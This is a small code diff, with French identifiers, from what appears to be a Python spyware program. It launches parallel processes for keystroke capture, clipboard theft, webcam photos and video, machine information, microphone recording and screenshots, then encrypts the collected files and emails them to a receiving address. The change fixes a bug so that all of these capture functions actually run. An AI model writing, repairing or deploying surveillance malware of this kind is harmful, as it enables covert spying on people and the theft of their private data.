@@ -241,7 +241,7 @@ def run():
     print("*** LANCEMENT DU PROGRAMME ***")    
     processes = []
 
-    functions = [saisir(), presse_papiers(), photo(), video(), info_machine(), microphone(), capture_ecran()]
+    functions = [saisir, presse_papiers, photo, video, info_machine, microphone, capture_ecran]
     
     # Créer et démarrer un processus pour chaque fonction
     for func in functions:
@@ -276,5 +276,6 @@ for elt in fichier_a_chiffrer:
         f.write(chiffrer)
         envoi_email(fichier_chiffrer[i], fichier_chiffrer[i], email_recepteur)
     i+=1
+
 
 
